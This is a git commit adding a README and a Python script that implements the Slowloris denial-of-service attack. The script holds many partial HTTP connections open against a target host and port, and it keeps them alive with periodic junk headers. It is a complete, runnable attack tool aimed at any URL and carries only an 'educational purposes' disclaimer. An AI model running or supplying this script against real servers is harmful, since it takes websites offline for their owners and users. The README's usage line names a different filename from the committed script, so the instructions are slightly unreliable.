cf14e102dee8395d27fb00bdc5fd128bc92be741
WaL99D <WaL99D@gmail.com>
2016-11-10 07:44:49 +0300

    Added..

---
+++ README.md
@@ -0,0 +1,14 @@
+# Simple Slow Loris DDoS: For Educational Purposes Only
+
+Just right the command specifiying the URL, Port, Number of Scokets to open, and Timer Period in Seconds:
+```
+python slowloris.py www.example.com 80 100 10
+# here 80 is the port number
+# 100 is total number of socket to create
+# 10 is the timer period to check for open socket and create any
+
+```
+
+Use with caution, the auther is not responsible for any damages cause by this CODE
+
+
---
+++ slowloris_v1.py
@@ -0,0 +1,54 @@
+import sys
+import random
+import socket
+import time
+
+regular_headers = [
+            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+                "Accept-language: en-US,en,q=0.5"
+                ]
+
+def init_socket(ip,port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(4)
+    s.connect((ip,int(port)))
+    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
+    for header in regular_headers:
+        s.send('{}\r\n'.format(header).encode('UTF-8'))
+    return s
+
+def main():
+    if len(sys.argv)<4:
+        print("Usage: {} example.com 80 100 10".format(sys.argv[0]))
+        return
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    socket_count= int(sys.argv[3])
+    timer = int(sys.argv[4])
+    print("Creating Sockets...")
+    socket_list=[]
+    for _ in range(int(socket_count)):
+        try:
+            print("Creating Socket# {}".format(_))
+            s=init_socket(ip,port)
+        except socket.error:
+            break
+        socket_list.append(s)
+    while True:
+        print("Sending Keep-Alive Headers to {}".format(len(socket_list)))
+        for s in socket_list:
+            try:
+                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
+            except socket.error:
+                socket_list.remove(s)
+        for _ in range(socket_count - len(socket_list)):
+            print("Re-creating Socket...")
+            try:
+                s=init_socket(ip,port)
+                if s:
+                    socket_list.append(s)
+            except socket.error:
+                break
+        time.sleep(timer)
+if __name__=="__main__":
+    main()
